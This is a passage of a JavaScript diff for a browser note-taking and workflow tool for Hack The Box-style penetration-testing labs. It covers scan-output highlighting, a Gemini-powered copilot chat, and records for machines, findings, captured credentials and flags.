+    rootBox.innerHTML = "<b>" + esc(h.ip) + "</b>" + (h.name ? ' <span class="sub">' + esc(h.name) + "</span>" : "") + ' <span class="sub">' + esc(h.status) + "</span>";
+    rootLi.appendChild(rootBox);
+    if(children.length){
+      var ul = document.createElement("ul");
+      ul.className = "tree";
+      children.forEach(function(c){ ul.appendChild(c); });
+      rootLi.appendChild(ul);
+    }
+    rootUl.appendChild(rootLi);
+    wrap.appendChild(rootUl);
+    var note = document.createElement("p");
+    note.className = "small muted";
+    note.style.marginTop = "12px";
+    note.textContent = "Add services from the Scan Analysis page, record findings in Evidence, and capture credentials in the Loot Locker to grow this tree.";
+    wrap.appendChild(note);
+  } else {
+    var intro = document.createElement("p");
+    intro.className = "muted";
+    intro.textContent = h ? "No services, findings, or credentials recorded for " + hostLabel(h) + " yet — showing example paths. Add data to see this host's own attack tree." : "No host selected — showing example paths. Select a host in the Workspace to build its own attack tree.";
+    wrap.appendChild(intro);
+    EXAMPLE_CHAINS.forEach(function(ch){
+      wrap.appendChild(chainCard(ch.title, ch.nodes, true));
+    });
+  }
+}
+
+/* ================= SCAN ANALYSIS ================= */
+function highlightScan(text){
+  var h = esc(text);
+  h = h.replace(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g, function(m){ return '<span class="hl-ip">'+m+'</span>'; });
+  h = h.replace(/\b(\d{1,5})\/(tcp|udp)\b/g, '<span class="hl-port">$1/$2</span>');
+  h = h.replace(/\b(open|filtered|closed|Nmap|PORT|STATE|SERVICE|VERSION|Discovered|Starting|Interesting|CVE-\d{4}-\d+)\b/g, '<span class="hl-kw">$1</span>');
+  return h;
+}
+var scanInput = $("#scanInput");
+var scanPreview = $("#scanPreview");
+function updateScanPreview(){
+  var v = scanInput.value;
+  if(!v.trim()){
+    scanPreview.textContent = "Paste output on the left to see it highlighted here.";
+    renderDetectionCards($("#scanDetections"), []);
+    renderRecs($("#scanRecs"), []);
+    save("dex.scan.v1", v);
+    renderDynamicRecs();
+    return;
+  }
+  scanPreview.innerHTML = highlightScan(v);
+  var services = parseScan(v);
+  renderDetectionCards($("#scanDetections"), services);
+  renderRecs($("#scanRecs"), services);
+  save("dex.scan.v1", v);
+  renderDynamicRecs();
+}
+scanInput.addEventListener("input", debounce(updateScanPreview, 150));
+$("#scanClear").addEventListener("click", function(){
+  scanInput.value = ""; updateScanPreview(); scanInput.focus();
+  toast("Scan output cleared", "ok");
+});
+$("#addServicesBtn").addEventListener("click", function(){
+  var h = currentHost();
+  if(!h){ toast("Select a host first (Workspace tab)", "err"); showPage("workspace"); return; }
+  var services = parseScan(scanInput.value);
+  if(!services.length){ toast("No open ports detected in the pasted output", "err"); return; }
+  var added = 0;
+  services.forEach(function(s){
+    var exists = (h.services || []).some(function(x){ return x.port === s.port; });
+    if(!exists){ h.services = h.services || []; h.services.push({port: s.port, proto: s.proto, service: s.service}); added++; }
+  });
+  saveHosts();
+  renderWorkspace(); renderChains(); updateAiContext();
+  logActivity(added + " service(s) added to " + h.ip + " from scan");
+  toast(added ? added + " service(s) added to " + h.ip : "All detected services already on " + h.ip, "ok");
+});
+scanInput.value = load("dex.scan.v1", "");
+
+/* ================= AI COPILOT (with context memory) ================= */
+var AI_SYS = "You are DEX Copilot, a concise cybersecurity assistant for Hack The Box labs and penetration testing. Give real, standard commands with correct flags. Never invent a flag, tool, or syntax. If you are unsure, say so. Keep answers short and command-focused.";
+var aiKey = load("dex.geminiKey", "");
+var aiLog = $("#aiLog");
+var aiInput = $("#aiInput");
+
+function buildAiContext(){
+  var h = currentHost();
+  var hostCreds = h ? creds.filter(function(c){ return c.hostId === h.id; }) : [];
+  var hostFindings = h ? findings.filter(function(f){ return f.hostId === h.id; }) : [];
+  var scan = scanInput.value.trim();
+  return {
+    host: h ? h.ip : null,
+    hostName: h ? (h.name || null) : null,
+    hostStatus: h ? h.status : null,
+    services: h && h.services ? h.services.map(function(s){ return s.port + "/" + (s.proto || "tcp") + " " + s.service; }) : [],
+    objective: OBJECTIVES[state.objective].label,
+    credentials: hostCreds.map(function(c){ return {username: c.username, password: c.password || "", service: c.service || ""}; }),
+    openFindings: hostFindings.map(function(f){ return {title: f.title, severity: f.severity, finding: f.finding || ""}; }),
+    latestScan: scan ? scan.slice(0, 2000) : ""
+  };
+}
+function updateAiContext(){
+  var ctx = buildAiContext();
+  var body = $("#aiContextBody");
+  var h = currentHost();
+  var hostCreds = h ? creds.filter(function(c){ return c.hostId === h.id; }) : [];
+  var hostFindings = h ? findings.filter(function(f){ return f.hostId === h.id; }) : [];
+  var lines = [];
+  lines.push('<div class="ctx-line">Host: <b>' + esc(h ? hostLabel(h) : "none selected") + '</b></div>');
+  lines.push('<div class="ctx-line">Objective: <b>' + esc(OBJECTIVES[state.objective].label) + '</b></div>');
+  lines.push('<div class="ctx-line">Services: <b>' + (ctx.services.length ? esc(ctx.services.join(", ")) : "none recorded") + '</b></div>');
+  lines.push('<div class="ctx-line">Credentials on host: <b>' + hostCreds.length + (hostCreds.length ? " (" + esc(hostCreds.map(function(c){ return c.username; }).join(", ")) + ")" : "") + '</b></div>');
+  lines.push('<div class="ctx-line">Open findings: <b>' + hostFindings.length + '</b></div>');
+  lines.push('<div class="ctx-line">Latest scan: <b>' + (ctx.latestScan ? ctx.latestScan.length + " chars attached" : "none pasted") + '</b></div>');
+  body.innerHTML = lines.join("");
+}
+function aiKeyStatus(){
+  var has = !!aiKey;
+  $("#keyPill").classList.toggle("nokey", !has);
+  $("#keyPillText").textContent = has ? "AI: key saved" : "AI: no key";
+  $("#aiKeyPill").classList.toggle("nokey", !has);
+  $("#aiKeyPillText").textContent = has ? "Key saved" : "No key";
+}
+function aiAddMsg(role, text, isErr){
+  var div = document.createElement("div");
+  div.className = "msg " + (isErr ? "err" : role);
+  if(role === "ai"){ div.innerHTML = md(text); }
+  else { div.textContent = text; }
+  aiLog.appendChild(div);
+  aiLog.scrollTop = aiLog.scrollHeight;
+}
+function aiSetKey(v){
+  aiKey = v;
+  save("dex.geminiKey", v);
+  aiKeyStatus();
+}
+$("#aiKeySave").addEventListener("click", function(){
+  var v = $("#aiKey").value.trim();
+  if(!v){ aiAddMsg("ai", "Paste a Gemini API key first.", true); return; }
+  aiSetKey(v);
+  $("#aiKey").value = "";
+  aiAddMsg("ai", "Key saved in this browser. Ask me anything about the current machine.");
+  toast("Gemini API key saved", "ok");
+});
+$("#aiKeyForget").addEventListener("click", function(){
+  aiSetKey("");
+  $("#aiKey").value = "";
+  aiAddMsg("ai", "Key forgotten. AI features will show \u201CGemini API key required.\u201D until you save a new one.");
+  toast("Gemini API key forgotten", "ok");
+});
+function aiSend(text){
+  var msg = (text !== undefined ? text : aiInput.value).trim();
+  if(!msg) return;
+  if(!aiKey){
+    openAiPanel();
+    aiAddMsg("ai", "Gemini API key required.", true);
+    return;
+  }
+  aiAddMsg("user", msg);
+  aiInput.value = "";
+  var thinking = document.createElement("div");
+  thinking.className = "msg ai";
+  thinking.textContent = "Thinking\u2026";
+  aiLog.appendChild(thinking);
+  aiLog.scrollTop = aiLog.scrollHeight;
+  var ctx = buildAiContext();
+  var full = "Workspace context (JSON):\n" + JSON.stringify(ctx, null, 2) + "\n\nUser request:\n" + msg;
+  fetch("https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=" + encodeURIComponent(aiKey), {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      systemInstruction: {parts: [{text: AI_SYS}]},
+      contents: [{role: "user", parts: [{text: full}]}]
+    })
+  }).then(function(r){
+    return r.json().then(function(data){ return {ok: r.ok, status: r.status, data: data}; });
+  }).then(function(res){
+    thinking.remove();
+    if(!res.ok){
+      var em = (res.data && res.data.error && res.data.error.message) ? res.data.error.message : ("Request failed (HTTP " + res.status + ").");
+      aiAddMsg("ai", "Gemini error: " + em, true);
+      return;
+    }
+    var parts = res.data && res.data.candidates && res.data.candidates[0] && res.data.candidates[0].content && res.data.candidates[0].content.parts;
+    var out = parts ? parts.map(function(p){ return p.text || ""; }).join("") : "";
+    aiAddMsg("ai", out || "No response from the model.");
+  }).catch(function(err){
+    thinking.remove();
+    aiAddMsg("ai", "Network error: " + err.message + ". Check your connection and try again.", true);
+  });
+}
+$("#aiSend").addEventListener("click", function(){ aiSend(); });
+aiInput.addEventListener("keydown", function(e){
+  if(e.key === "Enter" && !e.shiftKey){ e.preventDefault(); aiSend(); }
+});
+$$("#aiQa .qa-btn").forEach(function(b){
+  b.addEventListener("click", function(){
+    var tpl = QA_TEMPLATES[b.getAttribute("data-qa")] || "";
+    var scan = scanInput.value.trim();
+    aiInput.value = tpl + (scan ? scan : "");
+    openAiPanel();
+    aiInput.focus();
+  });
+});
+$("#sendScanBtn").addEventListener("click", function(){
+  var scan = scanInput.value.trim();
+  if(!scan){ aiAddMsg("ai", "Paste some scan output first, then Send To AI.", true); openAiPanel(); return; }
+  var h = currentHost();
+  var msg = "Current Host: " + (h ? hostLabel(h) : "none selected") + "\nCurrent Section: " + OBJECTIVES[state.objective].label + "\n\nAnalysis:\n" + scan;
+  openAiPanel();
+  aiSend(msg);
+  logActivity("Scan sent to AI for " + (h ? h.ip : "no host"));
+});
+
+/* AI panel open/close */
+function openAiPanel(){ $("#aiPanel").classList.add("open"); updateAiContext(); }
+function closeAiPanel(){ $("#aiPanel").classList.remove("open"); }
+function toggleAiPanel(){ $("#aiPanel").classList.toggle("open"); if($("#aiPanel").classList.contains("open")) updateAiContext(); }
+$("#aiToggle").addEventListener("click", toggleAiPanel);
+$("#openAiBtn").addEventListener("click", openAiPanel);
+$("#aiClose").addEventListener("click", closeAiPanel);
+
+/* ================= HTB VAULT ================= */
+var vault = load("dex.vault.v1", []);
+var editingId = null;
+var DIFF_ORDER = {Easy:0, Medium:1, Hard:2, Insane:3};
+function vaultFiltered(){
+  var q = $("#vSearch").value.trim().toLowerCase();
+  var fd = $("#vFilterDiff").value;
+  var fp = $("#vFilterPlat").value;
+  var sort = $("#vSort").value;
+  var list = vault.filter(function(v){
+    if(fd && v.diff !== fd) return false;
+    if(fp && v.plat !== fp) return false;
+    if(q && (v.name+" "+v.foothold+" "+v.privesc+" "+v.lessons+" "+v.plat).toLowerCase().indexOf(q) === -1) return false;
+    return true;
+  });
+  list.sort(function(a,b){
+    if(sort==="old") return a.ts - b.ts;
+    if(sort==="name") return a.name.localeCompare(b.name);
+    if(sort==="diff") return DIFF_ORDER[a.diff] - DIFF_ORDER[b.diff];
+    return b.ts - a.ts;
+  });
+  return list;
+}
+function renderVault(){
+  var wrap = $("#vaultList");
+  wrap.innerHTML = "";
+  var list = vaultFiltered();
+  if(!list.length){
+    var e = document.createElement("div");
+    e.className = "empty";
+    e.textContent = vault.length ? "No machines match your filters." : "Vault is empty. Add your first completed machine above.";
+    wrap.appendChild(e);
+    return;
+  }
+  list.forEach(function(v){
+    var div = document.createElement("div");
+    div.className = "vault-item";
+    div.innerHTML =
+      '<h3>'+esc(v.name)+'</h3>'+
+      '<div class="meta"><span class="diff-'+esc(v.diff)+'">'+esc(v.diff)+'</span> &middot; '+esc(v.plat)+' &middot; '+esc(new Date(v.ts).toLocaleDateString())+'</div>'+
+      '<p><span class="lbl">Initial foothold</span><br>'+esc(v.foothold || "—")+'</p>'+
+      '<p><span class="lbl">PrivEsc method</span><br>'+esc(v.privesc || "—")+'</p>'+
+      '<p><span class="lbl">Lessons learned</span><br>'+esc(v.lessons || "—")+'</p>';
+    var row = document.createElement("div");
+    row.className = "row";
+    var edit = document.createElement("button");
+    edit.type = "button"; edit.className = "btn-ghost btn-sm"; edit.textContent = "Edit";
+    edit.addEventListener("click", function(){ startEditVault(v.id); });
+    var del = document.createElement("button");
+    del.type = "button"; del.className = "btn-ghost btn-sm btn-danger"; del.textContent = "Delete";
+    del.addEventListener("click", function(){
+      armDelete(del, function(){
+        vault = vault.filter(function(x){ return x.id !== v.id; });
+        save("dex.vault.v1", vault);
+        renderVault();
+        logActivity("Vault machine deleted: " + v.name);
+        toast("Machine deleted", "ok");
+      });
+    });
+    row.appendChild(edit); row.appendChild(del);
+    div.appendChild(row);
+    wrap.appendChild(div);
+  });
+}
+function clearVaultForm(){
+  editingId = null;
+  ["vName","vDiff","vPlat","vFoothold","vPrivesc","vLessons"].forEach(function(id){
+    var el = document.getElementById(id);
+    if(el.tagName === "SELECT") el.selectedIndex = 0; else el.value = "";
+  });
+  $("#vaultFormTitle").textContent = "Add a machine";
+  $("#vCancelEdit").classList.add("hidden");
+  $("#vMsg").textContent = "";
+}
+function startEditVault(id){
+  var v = vault.filter(function(x){ return x.id === id; })[0];
+  if(!v) return;
+  editingId = id;
+  $("#vName").value = v.name; $("#vDiff").value = v.diff; $("#vPlat").value = v.plat;
+  $("#vFoothold").value = v.foothold; $("#vPrivesc").value = v.privesc; $("#vLessons").value = v.lessons;
+  $("#vaultFormTitle").textContent = "Edit machine";
+  $("#vCancelEdit").classList.remove("hidden");
+  $("#vName").focus();
+  window.scrollTo({top:0, behavior:"smooth"});
+}
+$("#vSave").addEventListener("click", function(){
+  var name = $("#vName").value.trim();
+  if(!name){ $("#vMsg").textContent = "Box Name is required."; $("#vName").focus(); return; }
+  var rec = {
+    id: editingId || ("v" + Date.now()),
+    ts: editingId ? (vault.filter(function(x){ return x.id===editingId; })[0] || {}).ts || Date.now() : Date.now(),
+    name: name,
+    diff: $("#vDiff").value,
+    plat: $("#vPlat").value,
+    foothold: $("#vFoothold").value.trim(),
+    privesc: $("#vPrivesc").value.trim(),
+    lessons: $("#vLessons").value.trim()
+  };
+  if(editingId){
+    vault = vault.map(function(x){ return x.id===editingId ? rec : x; });
+    $("#vMsg").textContent = "Updated.";
+    logActivity("Vault machine updated: " + name);
+  } else {
+    vault.push(rec);
+    $("#vMsg").textContent = "Saved to the vault.";
+    logActivity("Vault machine added: " + name);
+  }
+  save("dex.vault.v1", vault);
+  clearVaultForm();
+  renderVault();
+  toast("Saved to the vault", "ok");
+});
+$("#vCancelEdit").addEventListener("click", clearVaultForm);
+["vSearch","vFilterDiff","vFilterPlat","vSort"].forEach(function(id){
+  document.getElementById(id).addEventListener("input", renderVault);
+});
+
+/* ================= MARKDOWN (small built-in renderer) ================= */
+function mdInline(s){
+  var codes = [];
+  s = s.replace(/`([^`]+)`/g, function(m,c){ codes.push(c); return "\u0001"+(codes.length-1)+"\u0001"; });
+  s = s.replace(/\*\*([^*]+)\*\*/g, "<strong>$1</strong>");
+  s = s.replace(/\*([^*]+)\*/g, "<em>$1</em>");
+  s = s.replace(/\[([^\]]+)\]\((https?:[^)\s]+)\)/g, '<a href="$2" target="_blank" rel="noopener">$1</a>');
+  s = s.replace(/\u0001(\d+)\u0001/g, function(m,i){ return "<code>"+esc(codes[+i])+"</code>"; });
+  return s;
+}
+function md(src){
+  src = String(src).replace(/\r\n/g, "\n");
+  var blocks = [];
+  src = src.replace(/```(\w*)\n([\s\S]*?)```/g, function(m,l,c){ blocks.push(c); return "\u0000"+(blocks.length-1)+"\u0000"; });
+  var html = esc(src);
+  var lines = html.split("\n");
+  var out = "", inUl = false, inOl = false, inTable = false;
+  function closeLists(){ if(inUl){ out += "</ul>"; inUl = false; } if(inOl){ out += "</ol>"; inOl = false; } if(inTable){ out += "</tbody></table>"; inTable = false; } }
+  lines.forEach(function(line){
+    var m;
+    if(m = line.match(/^\|(.+)\|$/)){
+      var cells = m[1].split("|").map(function(c){ return mdInline(c.trim()); });
+      if(/^-+/.test(cells.join(""))){ return; }
+      if(!inTable){ closeLists(); out += '<table><tbody>'; inTable = true; }
+      out += "<tr>" + cells.map(function(c){ return "<td>"+c+"</td>"; }).join("") + "</tr>";
+    }
+    else if(m = line.match(/^###\s+(.*)/)){ closeLists(); out += "<h3>"+mdInline(m[1])+"</h3>"; }
+    else if(m = line.match(/^##\s+(.*)/)){ closeLists(); out += "<h2>"+mdInline(m[1])+"</h2>"; }
+    else if(m = line.match(/^#\s+(.*)/)){ closeLists(); out += "<h1>"+mdInline(m[1])+"</h1>"; }
+    else if(/^---+$/.test(line.trim())){ closeLists(); out += "<hr>"; }
+    else if(m = line.match(/^&gt;\s?(.*)/)){ closeLists(); out += "<blockquote>"+mdInline(m[1])+"</blockquote>"; }
+    else if(m = line.match(/^[-*]\s+(.*)/)){ if(inOl){ out += "</ol>"; inOl = false; } if(!inUl){ out += "<ul>"; inUl = true; } out += "<li>"+mdInline(m[1])+"</li>"; }
+    else if(m = line.match(/^\d+\.\s+(.*)/)){ if(inUl){ out += "</ul>"; inUl = false; } if(!inOl){ out += "<ol>"; inOl = true; } out += "<li>"+mdInline(m[1])+"</li>"; }
+    else if(line.trim() === ""){ closeLists(); }
+    else { closeLists(); out += "<p>"+mdInline(line)+"</p>"; }
+  });
+  closeLists();
+  out = out.replace(/<p>\u0000(\d+)\u0000<\/p>/g, function(m,i){ return "<pre><code>"+esc(blocks[+i])+"</code></pre>"; });
+  out = out.replace(/\u0000(\d+)\u0000/g, function(m,i){ return "<pre><code>"+esc(blocks[+i])+"</code></pre>"; });
+  return out;
+}
+
+/* ================= EVIDENCE (structured findings) ================= */
+var editingFindingId = null;
+function renderEvidence(){
+  var wrap = $("#evidenceList");
+  wrap.innerHTML = "";
+  var q = $("#eSearch").value.trim().toLowerCase();
+  var fs = $("#eFilterSev").value;
+  var fh = $("#eFilterHost").value;
+  var list = findings.filter(function(f){
+    if(fs && f.severity !== fs) return false;
+    if(fh && f.hostId !== fh) return false;
+    if(q && (f.title+" "+(f.finding||"")+" "+(f.evidence||"")+" "+(f.remediation||"")).toLowerCase().indexOf(q) === -1) return false;
+    return true;
+  }).slice().sort(function(a,b){ return b.ts - a.ts; });
+  if(!list.length){
+    var e = document.createElement("div");
+    e.className = "empty";
+    e.textContent = findings.length ? "No findings match your filters." : "No findings recorded yet. Add your first structured finding above — it will feed the Reporting Engine.";
+    wrap.appendChild(e);
+    return;
+  }
+  list.forEach(function(f){
+    var div = document.createElement("div");
+    div.className = "vault-item";
+    var h = f.hostId ? hostById(f.hostId) : null;
+    div.innerHTML =
+      '<h3>'+esc(f.title)+'</h3>'+
+      '<div class="meta"><span class="sev-badge '+esc(f.severity)+'">'+esc(f.severity)+'</span> &middot; ' + esc(h ? hostLabel(h) : (f.hostText || "No host")) + ' &middot; '+esc(new Date(f.ts).toLocaleDateString())+'</div>'+
+      '<p><span class="lbl">Finding</span><br>'+esc(f.finding || "—")+'</p>'+
+      '<p><span class="lbl">Evidence</span><br>'+esc(f.evidence || "—")+'</p>'+
+      '<p><span class="lbl">Remediation</span><br>'+esc(f.remediation || "—")+'</p>';
+    var row = document.createElement("div");
+    row.className = "row";
+    var edit = document.createElement("button");
+    edit.type = "button"; edit.className = "btn-ghost btn-sm"; edit.textContent = "Edit";
+    edit.addEventListener("click", function(){ startEditFinding(f.id); });
+    var del = document.createElement("button");
+    del.type = "button"; del.className = "btn-ghost btn-sm btn-danger"; del.textContent = "Delete";
+    del.addEventListener("click", function(){
+      armDelete(del, function(){
+        findings = findings.filter(function(x){ return x.id !== f.id; });
+        saveFindings();
+        renderEvidence(); renderWorkspace(); updateAiContext(); renderChains();
+        logActivity("Finding deleted: " + f.title);
+        toast("Finding deleted", "ok");
+      });
+    });
+    row.appendChild(edit); row.appendChild(del);
+    div.appendChild(row);
+    wrap.appendChild(div);
+  });
+}
+function clearEvidenceForm(){
+  editingFindingId = null;
+  ["eTitle","eFinding","eEvidence","eRemediation"].forEach(function(id){ document.getElementById(id).value = ""; });
+  $("#eSeverity").value = "Medium";
+  $("#eHost").value = "";
+  $("#eFormTitle").textContent = "Add a finding";
+  $("#eCancelEdit").classList.add("hidden");
+  $("#eMsg").textContent = "";
+}
+function startEditFinding(id){
+  var f = findings.filter(function(x){ return x.id === id; })[0];
+  if(!f) return;
+  editingFindingId = id;
+  $("#eTitle").value = f.title;
+  $("#eHost").value = f.hostId || "";
+  $("#eSeverity").value = f.severity;
+  $("#eFinding").value = f.finding || "";
+  $("#eEvidence").value = f.evidence || "";
+  $("#eRemediation").value = f.remediation || "";
+  $("#eFormTitle").textContent = "Edit finding";
+  $("#eCancelEdit").classList.remove("hidden");
+  $("#eTitle").focus();
+  window.scrollTo({top:0, behavior:"smooth"});
+}
+$("#eSave").addEventListener("click", function(){
+  var title = $("#eTitle").value.trim();
+  if(!title){ $("#eMsg").textContent = "Title is required."; $("#eTitle").focus(); return; }
+  var hostId = $("#eHost").value;
+  var rec = {
+    id: editingFindingId || uid("f"),
+    ts: editingFindingId ? (findings.filter(function(x){ return x.id===editingFindingId; })[0] || {}).ts || Date.now() : Date.now(),
+    title: title,
+    hostId: hostId,
+    hostText: hostId ? "" : "",
+    severity: $("#eSeverity").value,
+    finding: $("#eFinding").value.trim(),
+    evidence: $("#eEvidence").value.trim(),
+    remediation: $("#eRemediation").value.trim()
+  };
+  if(editingFindingId){
+    findings = findings.map(function(x){ return x.id===editingFindingId ? rec : x; });
+    $("#eMsg").textContent = "Updated.";
+    logActivity("Finding updated: " + title);
+  } else {
+    findings.push(rec);
+    $("#eMsg").textContent = "Finding saved.";
+    logActivity("Finding saved: " + title + (hostId ? " (" + (hostById(hostId) || {}).ip + ")" : ""));
+  }
+  saveFindings();
+  clearEvidenceForm();
+  renderEvidence(); renderWorkspace(); updateAiContext(); renderChains();
+  toast("Finding saved", "ok");
+});
+$("#eCancelEdit").addEventListener("click", clearEvidenceForm);
+["eSearch","eFilterSev","eFilterHost"].forEach(function(id){
+  document.getElementById(id).addEventListener("input", renderEvidence);
+});
+
+/* ================= LOOT LOCKER ================= */
+var editingLootId = null;
+function lootLabel(l){
+  if(l.kind === "credential") return (l.username || "?") + " @ " + (l.service || "credential");
+  if(l.kind === "hash") return (l.hashType || "Hash") + (l.username ? " — " + l.username : "");
+  if(l.kind === "file") return l.filename || "File";
+  if(l.kind === "flag") return (l.flagType || "Flag");
+  return "Loot";
+}
+function lootSearchText(l){
+  return [l.kind, l.username, l.service, l.hashType, l.hashValue, l.filename, l.fileNote, l.flagType, l.flagValue].join(" ");
+}
+function renderLoot(){
+  var wrap = $("#lootList");
+  wrap.innerHTML = "";
+  var q = $("#lSearch").value.trim().toLowerCase();
+  var fk = $("#lFilterKind").value;
+  var fh = $("#lFilterHost").value;
+  var list = loot.filter(function(l){
+    if(fk && l.kind !== fk) return false;
+    if(fh && l.hostId !== fh) return false;
+    if(q && lootSearchText(l).toLowerCase().indexOf(q) === -1) return false;
+    return true;
+  }).slice().sort(function(a,b){ return b.ts - a.ts; });
+  if(!list.length){
+    var e = document.createElement("div");
+    e.className = "empty";
+    e.textContent = loot.length ? "No loot matches your filters." : "Loot Locker is empty. Capture credentials, hashes, files, and flags as you find them.";
+    wrap.appendChild(e);
+    return;
+  }
+  list.forEach(function(l){
+    var div = document.createElement("div");
+    div.className = "vault-item";
+    var h = l.hostId ? hostById(l.hostId) : null;
+    var detail = "";
+    if(l.kind === "credential") detail = '<p><span class="lbl">Username</span><br>'+esc(l.username || "—")+'</p><p><span class="lbl">Password</span><br><code>'+esc(l.password || "—")+'</code></p><p><span class="lbl">Service</span><br>'+esc(l.service || "—")+'</p>';
+    if(l.kind === "hash") detail = '<p><span class="lbl">Type</span><br>'+esc(l.hashType || "—")+'</p><p><span class="lbl">Username</span><br>'+esc(l.username || "—")+'</p><p><span class="lbl">Hash</span><br><code style="word-break:break-all">'+esc(l.hashValue || "—")+'</code></p>';
+    if(l.kind === "file") detail = '<p><span class="lbl">Filename</span><br><code>'+esc(l.filename || "—")+'</code></p><p><span class="lbl">Note</span><br>'+esc(l.fileNote || "—")+'</p>';
+    if(l.kind === "flag") detail = '<p><span class="lbl">Flag</span><br>'+esc(l.flagType || "—")+'</p><p><span class="lbl">Value</span><br><code style="word-break:break-all">'+esc(l.flagValue || "—")+'</code></p>';
+    div.innerHTML =
+      '<h3>'+esc(lootLabel(l))+'</h3>'+
+      '<div class="meta">' + esc(l.kind) + ' &middot; ' + esc(h ? hostLabel(h) : "No host") + ' &middot; '+esc(new Date(l.ts).toLocaleDateString())+'</div>' + detail;
+    var row = document.createElement("div");
+    row.className = "row";
+    var edit = document.createElement("button");
+    edit.type = "button"; edit.className = "btn-ghost btn-sm"; edit.textContent = "Edit";
+    edit.addEventListener("click", function(){ startEditLoot(l.id); });
+    var del = document.createElement("button");
+    del.type = "button"; del.className = "btn-ghost btn-sm btn-danger"; del.textContent = "Delete";
+    del.addEventListener("click", function(){
+      armDelete(del, function(){
+        loot = loot.filter(function(x){ return x.id !== l.id; });
+        saveLoot();
+        renderLoot(); renderWorkspace(); updateAiContext(); renderChains();
+        logActivity("Loot deleted: " + lootLabel(l));
+        toast("Loot deleted", "ok");
+      });
+    });
+    row.appendChild(edit); row.appendChild(del);
+    div.appendChild(row);
+    wrap.appendChild(div);
+  });
+}
+function updateLootFields(){
+  var k = $("#lKind").value;
+  $("#lFieldsCred").classList.toggle("hidden", k !== "credential");
+  $("#lFieldsHash").classList.toggle("hidden", k !== "hash");
+  $("#lFieldsFile").classList.toggle("hidden", k !== "file");
+  $("#lFieldsFlag").classList.toggle("hidden", k !== "flag");
+}
+$("#lKind").addEventListener("change", updateLootFields);
+function clearLootForm(){
+  editingLootId = null;
+  ["lUser","lPass","lService","lHashUser","lHashValue","lFileName","lFileNote","lFlagValue"].forEach(function(id){ document.getElementById(id).value = ""; });
+  $("#lKind").value = "credential";
+  $("#lHost").value = "";
+  updateLootFields();
+  $("#lFormTitle").textContent = "Add loot";
+  $("#lCancelEdit").classList.add("hidden");
+  $("#lMsg").textContent = "";
+}
+function startEditLoot(id){
+  var l = loot.filter(function(x){ return x.id === id; })[0];
+  if(!l) return;
+  editingLootId = id;
+  $("#lKind").value = l.kind;
+  $("#lHost").value = l.hostId || "";
+  updateLootFields();
+  if(l.kind === "credential"){ $("#lUser").value = l.username || ""; $("#lPass").value = l.password || ""; $("#lService").value = l.service || ""; }
+  if(l.kind === "hash"){ $("#lHashType").value = l.hashType || "NTLM"; $("#lHashUser").value = l.username || ""; $("#lHashValue").value = l.hashValue || ""; }
+  if(l.kind === "file"){ $("#lFileName").value = l.filename || ""; $("#lFileNote").value = l.fileNote || ""; }
+  if(l.kind === "flag"){ $("#lFlagType").value = l.flagType || "user.txt"; $("#lFlagValue").value = l.flagValue || ""; }
+  $("#lFormTitle").textContent = "Edit loot";
+  $("#lCancelEdit").classList.remove("hidden");
+  window.scrollTo({top:0, behavior:"smooth"});
+}
+$("#lSave").addEventListener("click", function(){
+  var kind = $("#lKind").value;
+  var hostId = $("#lHost").value;
+  var rec = {
+    id: editingLootId || uid("l"),
+    ts: editingLootId ? (loot.filter(function(x){ return x.id===editingLootId; })[0] || {}).ts || Date.now() : Date.now(),
+    kind: kind,
+    hostId: hostId,
+    username: "", password: "", service: "",
+    hashType: "", hashValue: "",
+    filename: "", fileNote: "",
+    flagType: "", flagValue: ""
+  };
+  if(kind === "credential"){
+    rec.username = $("#lUser").value.trim();
+    rec.password = $("#lPass").value;
+    rec.service = $("#lService").value.trim();
+    if(!rec.username){ $("#lMsg").textContent = "Username is required."; $("#lUser").focus(); return; }
+  }
+  if(kind === "hash"){
+    rec.hashType = $("#lHashType").value;
+    rec.username = $("#lHashUser").value.trim();
+    rec.hashValue = $("#lHashValue").value.trim();
+    if(!rec.hashValue){ $("#lMsg").textContent = "Hash value is required."; $("#lHashValue").focus(); return; }
+  }
+  if(kind === "file"){
+    rec.filename = $("#lFileName").value.trim();
+    rec.fileNote = $("#lFileNote").value.trim();
+    if(!rec.filename){ $("#lMsg").textContent = "Filename is required."; $("#lFileName").focus(); return; }
+  }
+  if(kind === "flag"){
+    rec.flagType = $("#lFlagType").value;
+    rec.flagValue = $("#lFlagValue").value.trim();
+    if(!rec.flagValue){ $("#lMsg").textContent = "Flag value is required."; $("#lFlagValue").focus(); return; }
+  }
+  if(editingLootId){
+    loot = loot.map(function(x){ return x.id===editingLootId ? rec : x; });
+    $("#lMsg").textContent = "Updated.";
+    logActivity("Loot updated: " + lootLabel(rec));
+  } else {
+    loot.push(rec);
+    $("#lMsg").textContent = "Loot saved.";
+    logActivity("Loot captured: " + lootLabel(rec) + (hostId ? " (" + (hostById(hostId) || {}).ip + ")" : ""));
+  }
+  /* credentials captured as loot also live in the credentials store for AI context + attack tree */
+  if(kind === "credential"){
+    var existing = creds.filter(function(c){ return c.username === rec.username && c.service === rec.service && c.hostId === rec.hostId; })[0];
+    if(existing){ existing.password = rec.password; }
+    else { creds.push({id: uid("c"), ts: rec.ts, hostId: rec.hostId, username: rec.username, password: rec.password, service: rec.service}); }
+    saveCreds();
+  }
+  saveLoot();
+  clearLootForm();
+  renderLoot(); renderWorkspace(); updateAiContext(); renderChains();
+  toast("Loot saved", "ok");
+});
+$("#lCancelEdit").addEventListener("click", clearLootForm);
+["lSearch","lFilterKind","lFilterHost"].forEach(function(id){
+  document.getElementById(id).addEventListener("input", renderLoot);
+});
+
+/* ================= PERSONAL NOTES ================= */
+var notes = load("dex.notes.v1", []);
+var activeNoteId = null;
+var previewMode = false;
+function noteById(id){ return notes.filter(function(n){ return n.id===id; })[0]; }
+function renderNoteList(){
+  var q = $("#nSearch").value.trim().toLowerCase();
+  var wrap = $("#noteList");
+  wrap.innerHTML = "";
+  var list = notes.filter(function(n){
+    return !q || (n.title+" "+n.body).toLowerCase().indexOf(q) !== -1;
+  }).slice().sort(function(a,b){ return b.updated - a.updated; });
+  if(!list.length){
+    var e = document.createElement("div");
+    e.className = "empty";
+    e.textContent = notes.length ? "No notes match your search." : "No notes yet. Click + New to start one.";
+    wrap.appendChild(e);
+    return;
+  }
+  list.forEach(function(n){
+    var b = document.createElement("button");
+    b.type = "button";
+    b.className = "note-list-item" + (n.id===activeNoteId ? " active" : "");
